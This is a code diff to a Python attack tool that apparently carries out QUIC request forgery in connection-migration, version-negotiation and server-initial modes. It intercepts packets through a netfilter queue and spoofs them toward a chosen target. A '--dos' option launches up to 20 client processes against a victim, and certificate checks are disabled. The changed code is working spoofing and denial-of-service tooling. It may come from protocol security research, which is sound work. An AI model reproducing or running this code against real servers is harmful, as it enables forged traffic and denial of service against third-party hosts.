@@ -61,7 +61,6 @@ def parse_arguments():
     optparser.add_argument('--victim_port','-v', help='The vicitm\'s listening port. Default ist 12345', default=12345, type=int)
     optparser.add_argument('--target_port','-t', help='The target\'s listening port', default=0, type=int)
     optparser.add_argument('--path','-p', help='The path to request for http requests', default="/")
-    optparser.add_argument('--limit','-l', help='Limits the amount of spoofed packets. A value of 0 will not limit the number of packets', type=int, default=0)
     optparser.add_argument('--alpn','-a', help='The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='h3')
     optparser.add_argument('--dos', '-d', help='Number of client processes to be started', type=int, default=1, choices=range(1,21), metavar="[1-22]")
     #optparser.add_argument('--verbose','-v', help='Turn on stdout and stderr for client subprocesses', action='store_true')
@@ -71,6 +70,7 @@ def parse_arguments():
     #Parser for CMRF
     parser_cm = subparsers.add_parser('cm', help='Connection migration mode', parents=[optparser], description=gen_desc + '\nConnection Migration Mode', formatter_class=RawTextHelpFormatter)
     parser_cm.add_argument('--start_time','-s', help='The time to wait until triggering the connection migration', type=int, default=4)
+    parser_cm.add_argument('--limit','-l', help='Limits the amount of spoofed packets (Default: 0 = No limit)', type=int, default=0)
     parser_cm._optionals.title = 'Optional Arguments'
     parser_cm._positionals.title = 'Required Arguments'
 
@@ -142,7 +142,7 @@ def server_initial_callback(packet, args=None):
     if args.limit != 0 and SPOOFED_COUNT >= args.limit:
         packet.drop()
         return
-    #if SPOOFED_COUNT >= 1: 
+
     packet = spoof_packet(packet, args.target_ip, args.target_port)
     if args.limit != 0:
         SPOOFED_COUNT += 1
@@ -152,6 +152,8 @@ def server_initial_callback(packet, args=None):
 
 def configure_client(args):
 
+    if args.path[0] != "/":
+        args.path = "/" + args.path
     url = "https://{victim_ip}:{victim_port}{path}".format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path)
     version = 'VNRF' if args.mode == "vn" else "VERSION_1"
     cid_len = args.cid_len if "cid_len" in args else 20
@@ -161,11 +163,12 @@ def configure_client(args):
         supported_versions =  [QuicProtocolVersion[version].value],
         alpn_protocols=[args.alpn],
         verify_mode = ssl.CERT_NONE,
-        secrets_log_file = open("secrets/secrets.log","a"),
+        secrets_log_file = open("secrets/secrets.log","w"),
         connection_id_length = cid_len,
     )
     
     return url, configuration
+
 
 def main():
 
@@ -184,20 +187,21 @@ def main():
     try:
         #Initializing netfilter queue
         q = NetfilterQueue()
-        p = None
-        args.limit = args.limit * args.dos
+        processes = []
         if args.mode == 'cm':
+            args.limit = args.limit * args.dos
             q.bind(1, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
         elif args.mode == 'vn':
+            args.limit = args.dos
             q.bind(1, lambda packet, args=args : version_negotiation_callback(packet, args))
         elif args.mode == 'si':
+            args.limit = args.dos
             q.bind(1, lambda packet,args=args : server_initial_callback(packet, args))
         else:
             raise NotImplementedError("Mode not implemented")
 
         print("[+] Starting client")
         url, configuration = configure_client(args)
-        processes = []
         for i in range(1,args.dos+1):
             p = Process(target=cl.start_client, args=(url, configuration,))
             processes.append(p)
